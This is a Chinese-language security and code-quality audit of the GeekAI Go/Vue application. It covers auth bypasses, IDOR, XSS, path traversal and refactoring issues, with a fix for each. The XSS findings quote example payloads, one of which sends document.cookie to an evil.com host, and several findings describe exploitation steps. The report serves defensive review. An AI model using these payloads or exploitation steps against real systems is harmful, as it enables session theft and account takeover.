# GeekAI 代码审查报告

> 审查日期: 2026-05-26
> 审查范围: 全项目代码质量 + 安全性审查
> 涉及模块: Go 后端 (`api/`) + Vue 3 前端 (`web/`)

---

## 一、安全漏洞

### 严重 (HIGH)

#### 1. 管理员订单接口缺少认证中间件

- **文件**: `api/handler/admin/order_handler.go:33-38`
- **类别**: auth_bypass
- **置信度**: 0.95
- **描述**: 所有其他 admin handler 都使用了 `AdminAuthMiddleware`，唯独订单接口没有。任何人可以未认证访问 `POST /api/admin/order/list` 查看所有订单数据，或删除/清空订单。
- **利用场景**: 攻击者直接调用 `/api/admin/order/list` 获取所有用户的订单信息（用户名、金额、支付渠道），或调用 `remove` / `clear` 删除订单数据。
- **修复建议**: 添加 `group.Use(middleware.AdminAuthMiddleware(h.App.Config.AdminSession.SecretKey, h.App.Redis))`

#### 2. 聊天接口未认证 + 用户可控 UserId (IDOR)

- **文件**: `api/handler/chat_handler.go:86-89, 177-179`
- **类别**: auth_bypass / IDOR
- **置信度**: 0.90
- **描述**: `/api/chat/message` 直接从请求体读取 `UserId`，攻击者可以冒充任意用户发送消息、消耗算力。
- **利用场景**: 攻击者发送 `POST /api/chat/message` 并指定 `"user_id": 1`，系统以该用户身份执行 AI 请求，算力从受害者账户扣除，聊天记录归受害者所有。
- **修复建议**: 从 JWT token 获取用户 ID，而非请求体。如确实需要未认证访问，应对匿名用户严格限流且不接受 UserId 参数。

#### 3. 微信登录回调可伪造 OpenID

- **文件**: `api/handler/user_handler.go:428-452`
- **类别**: auth_bypass / 账户劫持
- **置信度**: 0.85
- **描述**: 回调端点未认证，攻击者可伪造 `openid` 获取任意用户 JWT token。
- **利用场景**: 攻击者获取 state 值后，直接调用 `POST /api/user/login/callback` 传入已知受害者的 openid，然后调用 `GET /api/user/login/status` 获取有效 JWT token。
- **修复建议**: 验证回调来源（IP 白名单或签名验证），确保请求确实来自微信服务。

#### 4. 前端 XSS — MarkdownIt `html: true` + `v-html`

- **文件**: `web/src/components/ChatReply.vue`, `web/src/components/mobile/ChatReply.vue`, `web/src/components/ChatPrompt.vue`
- **类别**: XSS
- **置信度**: 0.90
- **描述**: AI 回复内容通过 `html: true` 的 MarkdownIt 渲染后直接通过 `v-html` 注入 DOM，恶意 HTML 可执行。
- **利用场景**: AI 模型被诱导输出 `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`，在用户浏览器中执行 JavaScript，窃取会话信息。
- **修复建议**: 设置 `html: false`，或使用 DOMPurify 对渲染输出进行消毒。

#### 5. 前端 XSS — `processContent()` 原始 HTML 注入

- **文件**: `web/src/utils/libs.js:203-216`
- **类别**: XSS
- **置信度**: 0.92
- **描述**: `<think...>` 标签内容未经转义直接包裹在 `<blockquote>` 中，可通过 AI 推理输出注入恶意 HTML。
- **利用场景**: AI 在推理模式输出 `<think"><img src=x onerror="alert(document.cookie)"/></think >`，捕获内容作为原始 HTML 渲染。
- **修复建议**: HTML 编码捕获的内容后再包裹：`content.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')`

#### 6. Token 通过 URL 查询参数传递

- **文件**: `web/src/views/Login.vue:60, 87-89`
- **类别**: Token 泄露
- **置信度**: 0.88
- **描述**: JWT token 从 URL query string 读取，会泄露到 Referer 头、浏览器历史、代理服务器日志中。
- **利用场景**: 用户从登录页导航到外部链接时，URL 中的 token 通过 Referer 头发送到目标站点；或浏览器历史记录可被恶意扩展/物理访问者获取。
- **修复建议**: 使用 POST body 传递 token，读取后立即用 `router.replace()` 清除 URL 中的参数。

---

### 中等 (MEDIUM)

#### 7. 公共配置接口暴露敏感信息

- **文件**: `api/handler/config_handler.go:30-56`
- **类别**: 信息泄露
- **置信度**: 0.85
- **描述**: `GET /api/config/get?key=<name>` 是未认证的公共端点，`key` 参数无白名单过滤，攻击者可读取 payment、sms、smtp 等含凭据的配置。
- **修复建议**: 对此端点加认证，或限制允许的配置键名为非敏感键名。

#### 8. ResetPass 缺少密码长度校验

- **文件**: `api/handler/user_handler.go:571-618`
- **类别**: 弱认证
- **置信度**: 0.90
- **描述**: 注册和 UpdatePass 都要求密码最少 8 位，但 ResetPass（通过验证码重置密码）完全没有长度校验。
- **修复建议**: 添加 `if len(data.Password) < 8` 检查。

#### 9. `math/rand` 用于盐值和密钥生成

- **文件**: `api/utils/strings.go:26-35`
- **类别**: 弱加密
- **置信度**: 0.82
- **描述**: `RandString` 使用 `math/rand`（以 `time.Now().UnixNano()` 为种子）生成密码盐值、JWT 会话密钥、邀请码等安全敏感值。攻击者若知道大致时间，可重建随机序列。注意：同文件中 `GenRedeemCode` 已正确使用 `crypto/rand`。
- **修复建议**: 对安全敏感的随机生成使用 `crypto/rand`。

#### 10. 静态文件路径未规范化

- **文件**: `api/core/middleware/static.go:35-36`
- **类别**: path_traversal
- **置信度**: 0.80
- **描述**: 自定义缩略图处理直接用 `c.Request.URL.Path` 构造文件路径打开文件，未验证路径是否在静态目录内。
- **修复建议**: 解析路径后验证 `filepath.Abs(filePath)` 以静态目录为前缀。

#### 11. 管理员聊天记录查看器 XSS

- **文件**: `web/src/views/admin/records/ChatList.vue:179, 323`
- **类别**: XSS
- **置信度**: 0.85
- **描述**: 管理员查看聊天记录时，消息内容通过 `html: true` 的 MarkdownIt + `v-html` 渲染。恶意消息可劫持管理员会话。
- **修复建议**: 使用 DOMPurify 消毒或设置 `html: false`。

#### 12. 移动端 ChatPrompt 无 HTML 编码

- **文件**: `web/src/components/mobile/ChatPrompt.vue:8`
- **类别**: XSS
- **置信度**: 0.82
- **描述**: 移动端 ChatPrompt 跳过了 `processPrompt()` HTML 编码，原始 `props.content.text` 直接通过 `v-html` 渲染。
- **修复建议**: 与桌面端保持一致，应用 `processPrompt()` 编码。

#### 13. `.env.development` 提交了默认凭据

- **文件**: `web/.env.development`
- **类别**: 凭据泄露
- **置信度**: 0.85
- **描述**: 开发环境文件含硬编码凭据（`admin/admin123`）并提交到版本控制，若生产环境复用或仓库公开则存在风险。
- **修复建议**: 移入 `.env.local`（已 gitignore），不提交凭据。

---

## 二、代码质量问题

### 严重 (HIGH) — 必须修复

#### 1. 邀请码功能完全失效（变量遮蔽 Bug）

- **文件**: `api/handler/user_handler.go:351-353`
- **描述**: 局部变量 `inviteCode := model.InviteCode{}` 遮蔽了函数参数 `inviteCode string`，导致数据库查询永远搜索空字符串，邀请码功能完全不工作。
- **修复**: 重命名局部变量为 `inviteRecord`。

#### 2. `CopyObject` 吞掉所有 panic，始终返回 nil

- **文件**: `api/utils/common.go:29-104`
- **描述**: `recover()` 捕获 panic 后只记录日志，调用者永远不知道复制失败，导致使用未完整初始化的对象。
- **修复**: 移除 `recover()`，修复根因（可能是字段类型不匹配导致的空指针）；或从 recover 中返回 error。

#### 3. Redis 会话永不过期

- **文件**: `api/handler/user_handler.go:421`
- **描述**: `redis.Set(..., 0)` 设置 TTL 为 0，Token 永远堆积在 Redis 中，造成内存持续增长。
- **修复**: 设置 TTL 为 `time.Duration(h.App.Config.Session.MaxAge) * time.Second`。

#### 4. `sendMessage` 约 200 行，职责混杂

- **文件**: `api/handler/chat_handler.go:177-378`
- **描述**: Handler 直接操作数据库加载用户、模型、角色、函数定义、历史消息，同时构建 API 请求、验证权限、计算 token、处理文件附件。违反关注点分离原则。
- **修复**: 提取业务逻辑到 `ChatService`，Handler 只负责 HTTP 绑定和响应写入。

#### 5. ChatPlus.vue 是 1684 行的上帝组件

- **文件**: `web/src/views/ChatPlus.vue`
- **描述**: 单个组件管理聊天列表、SSE 流式传输、消息发送、模型选择 UI、文件上传/拖放、历史加载、搜索、编辑、删除、语音聊天、UI 布局等所有功能。`<script setup>` 约 1090 行。
- **修复**: 拆分为 composable 函数（`useChatSSE`, `useFileUpload`, `useModelSelector`）和子组件（`ChatSidebar`, `ChatInput`, `ModelSelector`）。

#### 6. 移动端 ChatPrompt 缺少 `computed` 导入

- **文件**: `web/src/components/mobile/ChatPrompt.vue:40-43`
- **描述**: `computed` 在第 40、43 行使用但从未导入，运行时抛出 `ReferenceError: computed is not defined`。
- **修复**: 添加 `import { computed, onMounted, ref } from 'vue'`。

#### 7. `disableInput` 未定义

- **文件**: `web/src/views/ChatPlus.vue:1267`
- **描述**: `editUserPrompt` 中调用 `disableInput(false)` 但该函数未定义，用户编辑消息时运行时报错。
- **修复**: 定义该函数或移除调用（疑似遗留代码）。

#### 8. 主题状态在两个 store 中重复

- **文件**: `web/src/store/sharedata.js` 和 `web/src/store/theme.js`
- **描述**: 两处各维护独立的 `theme` 状态和 `setTheme` 方法，分别使用 `good-storage` 和 `localStorage` 持久化。所有组件调用 `useSharedStore.setTheme()` 但应用初始化从 `useThemeStore` 读取，两处会不同步。
- **修复**: 合并到单一 store，移除重复的 `useThemeStore`。

#### 9. 直接修改 props

- **文件**: `web/src/components/ChatReply.vue:198-199`
- **描述**: `props.data.icon = 'images/gpt-icon.png'` 直接修改 props，违反 Vue 单向数据流原则。
- **修复**: 用 `computed(() => props.data.icon || 'images/gpt-icon.png')` 派生值。

#### 10. Clipboard 实例从未销毁

- **文件**: 多处（25+ 个 `new Clipboard(...)` 调用）
- **描述**: `Clipboard` 在 `onMounted` 中创建但从未在 `onUnmounted` 中调用 `.destroy()`，DOM 事件监听器不会被清理，造成内存泄漏。
- **修复**: 存储 clipboard 实例到 ref，在 `onUnmounted` 中调用 `.destroy()`。

---

### 中等 (MEDIUM)

#### 11. 竞态条件：StopGenerate 非原子操作

- **文件**: `api/handler/chat_handler.go:473-479`
- **描述**: `StopGenerate` 对 `ReqCancelFunc` 执行 `Has` → `Get` → `Delete` 三步非原子操作，并发时可能引发空指针 panic。
- **修复**: 使用原子操作如 `GetAndDelete`。

#### 12. UserService 用 mutex 做并发控制（不支持分布式）

- **文件**: `api/service/user_service.go:15-16`
- **描述**: `sync.Mutex` 仅单实例有效，多实例部署时无法保护并发，且会成为性能瓶颈。
- **修复**: 使用数据库行锁 `SELECT ... FOR UPDATE` 或原子 `UPDATE ... WHERE power >= ?`。

#### 13. GET 方法用于状态变更操作

- **文件**: `api/handler/chat_handler.go:97-99`
- **描述**: `remove`、`clear`、`stop` 等状态变更操作使用 GET 方法，违反 REST 规范，可能被浏览器预取或 CSRF 触发。
- **修复**: 改为 `DELETE` 或 `POST`。

#### 14. 代理 HTTP 客户端无超时

- **文件**: `api/handler/chat_handler.go:518-527`
- **描述**: 配置代理时创建的 `http.Client` 没有设置 `Timeout`，请求可能无限挂起。
- **修复**: 设置合理超时如 `Timeout: 120 * time.Second`。

#### 15. Debug 日志打印密码盐值和哈希

- **文件**: `api/handler/user_handler.go:554`
- **描述**: `logger.Debugf(user.Salt, ",", user.Password, ",", password, ",", data.OldPass)` 将密码盐、哈希、计算值和原始密码写入日志。
- **修复**: 移除该行，永远不要记录密码相关数据。

#### 16. 微信用户默认密码 `geekai123` 硬编码

- **文件**: `api/handler/user_handler.go:327`
- **描述**: 微信创建的用户使用已知默认密码，任何人都可尝试登录。
- **修复**: 生成随机密码或禁用微信用户的密码登录。

#### 17. 注册 RegWay 未枚举验证，可绕过验证码

- **文件**: `api/handler/user_handler.go:136-150`
- **描述**: 若 `RegWay` 既不是 "email" 也不是 "mobile"，验证码检查被完全跳过。`RegWay: "other"` 可绕过验证。
- **修复**: 添加 `else` 分支对不支持的注册方式返回错误。

#### 18. MarkdownIt 配置在 4 个文件中重复

- **文件**: `web/src/components/ChatReply.vue`, `web/src/components/ChatPrompt.vue`, `web/src/components/mobile/ChatReply.vue`, `web/src/views/Index.vue`
- **描述**: 几乎相同的 `new MarkdownIt({...})` 配置（含 highlight、emoji、mathjax 插件）在四处复制粘贴。
- **修复**: 提取共享的 `createMarkdownRenderer()` 工具函数。

#### 19. `window.onresize` 未清理

- **文件**: 多处视图文件（ChatPlus.vue、AiDraw.vue、ImageSd.vue、ImageMj.vue、Dashboard.vue 等）
- **描述**: 使用 `window.onresize = ...` 赋值而非 `addEventListener`，组件卸载后回调不会被移除，且会相互覆盖。
- **修复**: 使用 `addEventListener` + `removeEventListener`，在 `onUnmounted` 中清理。

#### 20. SSE 错误信息直接渲染为 HTML

- **文件**: `web/src/views/ChatPlus.vue:827-829`
- **描述**: `err.message` 直接插入为 HTML 内容 `reply['content'].text = \`<div class="text-red-500 ...">${err.message}</div>\``，可能泄露内部信息或造成 XSS。
- **修复**: 清理错误信息或显示通用错误提示。

#### 21. MarkdownIt 在每个 SSE token 重新渲染（O(n²)）

- **文件**: `web/src/components/ChatReply.vue:12, 65`
- **描述**: SSE 流式传输时，每收到一个 token 就通过 `v-html` 触发 MarkdownIt 重新渲染全部内容，复杂度为 O(n²)。
- **修复**: 流式传输期间对 markdown 渲染做防抖，或每 N 毫秒才重新渲染一次。

#### 22. `store.socket.conn` 未做空值检查

- **文件**: `web/src/views/ChatPlus.vue:1270`
- **描述**: `store.socket.conn.send(...)` 调用前未检查 conn 是否存在，WebSocket 未连接时会抛出 TypeError。
- **修复**: 添加 `if (store.socket?.conn) { ... }` 守卫。

#### 23. 验证码检查逻辑重复 4 次

- **文件**: `api/handler/user_handler.go:136-150, 603-607, 631-637, 670-675`
- **描述**: Register、ResetPass、BindMobile、BindEmail 中验证码检查模式完全重复。
- **修复**: 提取 `verifyCode(ctx, key, code) error` 辅助方法。

#### 24. API Key 查找逻辑重复

- **文件**: `api/handler/chat_handler.go:486-493, 733-743` 及 `api/utils/openai.go:65-73`
- **描述**: 按 KeyId 查找或按类型轮询查找 API Key 的模式在多处重复。
- **修复**: 提取 `GetApiKey(keyId uint, keyType string)` 服务方法。

#### 25. `window.toggleCodeBlock` 全局函数污染

- **文件**: `web/src/components/ChatReply.vue:258`
- **描述**: 通过 `window.toggleCodeBlock = ...` 设置全局函数，多个组件实例会相互覆盖，卸载时未清理。
- **修复**: 使用事件委托或 Vue ref 替代全局函数。

#### 26. `isImageURL` 每次调用创建新 HTTP 客户端

- **文件**: `api/handler/chat_handler.go:405-416`
- **描述**: 每次检查图片 URL 都创建新的 `http.Client`，同步阻塞请求处理。
- **修复**: 复用包级别客户端，或并发执行多个检查。

#### 27. `DB.Debug()` 残留在生产代码中

- **文件**: `api/handler/chat_handler.go:273`
- **描述**: `h.DB.Debug().Where(...)` 启用 GORM 调试日志，生产环境会打印每条 SQL 查询。
- **修复**: 移除 `.Debug()` 调用。

#### 28. SQL 连接池参数硬编码

- **文件**: `api/store/mysql.go:45-47`
- **描述**: `MaxIdleConns(32)`, `MaxOpenConns(512)` 等参数硬编码，不适应所有部署环境。
- **修复**: 通过 `config.toml` 配置化。

---

## 三、统计汇总

### 安全漏洞

| 严重程度 | 数量 |
|----------|------|
| HIGH     | 6    |
| MEDIUM   | 7    |

### 代码质量问题

| 严重程度 | 数量 |
|----------|------|
| HIGH     | 10   |
| MEDIUM   | 18   |

---

## 四、优先修复建议

### 立即修复（安全 + Bug）

1. Admin 订单接口加认证中间件
2. 聊天接口从 JWT 取 UserId
3. 前端 MarkdownIt 设 `html: false`，`processContent` 加转义
4. 邀请码变量遮蔽 Bug
5. 移动端 `computed` 导入缺失
6. 移除密码相关的 debug 日志

### 短期修复（代码质量）

1. Redis 会话设置 TTL
2. 拆分 ChatPlus.vue 上帝组件
3. 修复 Clipboard 内存泄漏
4. 合并重复的 theme store
5. 提取重复的 MarkdownIt 配置和验证码检查逻辑

### 长期改进

1. 引入 TypeScript 提升类型安全
2. Handler 层业务逻辑下沉到 Service 层
3. 并发控制从 mutex 迁移到数据库行锁
4. 安全敏感的随机生成统一使用 `crypto/rand`
